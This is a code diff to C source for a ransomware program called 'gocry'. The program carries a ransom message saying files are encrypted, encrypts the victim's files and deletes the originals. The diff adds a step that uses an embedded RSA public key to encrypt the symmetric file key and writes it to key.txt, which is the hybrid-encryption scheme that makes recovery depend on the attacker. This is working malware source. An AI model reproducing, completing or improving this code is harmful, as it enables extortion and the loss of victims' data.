@@ -2,6 +2,7 @@
 #include <dirent.h>
 #include <netdb.h>
 #include <netinet/in.h>
+#include <openssl/bio.h>
 #include <openssl/evp.h>
 #include <openssl/ossl_typ.h>
 #include <openssl/pem.h>
@@ -21,7 +22,7 @@ const char *ransom_message = "You've been infected by gocry.\nAll your files are
 
 /* Embedded file: public-key.pem */
 const int fsize = 625;
-const unsigned char *file = {
+const unsigned char file[625] = {
     0x2d, 0x2d, 0x2d, 0x2d, 0x2d, 0x42, 0x45, 0x47, 0x49, 0x4e, 0x20, 0x50, 0x55, 0x42, 0x4c, 0x49, 0x43,
     0x20, 0x4b, 0x45, 0x59, 0x2d, 0x2d, 0x2d, 0x2d, 0x2d, 0x0a, 0x4d, 0x49, 0x49, 0x42, 0x6f, 0x6a, 0x41,
     0x4e, 0x42, 0x67, 0x6b, 0x71, 0x68, 0x6b, 0x69, 0x47, 0x39, 0x77, 0x30, 0x42, 0x41, 0x51, 0x45, 0x46,
@@ -168,6 +169,33 @@ int main(void) {
             printf("error deleting file after encryption\n");
         }
     }
+
+    EVP_PKEY *pkey;
+    BIO *pubkey_bio = BIO_new_mem_buf(file, fsize);
+    pkey = PEM_read_bio_PUBKEY(pubkey_bio, NULL, NULL, NULL);
+    BIO_free(pubkey_bio);
+    if (pkey == NULL) {
+        exit(EXIT_FAILURE);
+    }
+
+    RSA *rsa = EVP_PKEY_get1_RSA(pkey);
+    if (rsa == NULL) {
+        exit(EXIT_FAILURE);
+    }
+
+    char *encrypted_key = (char *)malloc(RSA_size(rsa));
+    int len;
+    if ((len = RSA_public_encrypt(strlen((const char *)encryption_key) + 1, (unsigned char *)encryption_key,
+                                  (unsigned char *)encrypted_key, rsa, RSA_PKCS1_OAEP_PADDING)) == -1) {
+        printf("error encrypting keys");
+        return 1;
+    }
+    FILE *out = fopen("./key.txt", "w");
+    fwrite(encrypted_key, sizeof(*encrypted_key), RSA_size(rsa), out);
+    fclose(out);
+    free(encrypted_key);
+
+    printf("key length: %d\n", len);
 
     return EXIT_SUCCESS;
 }
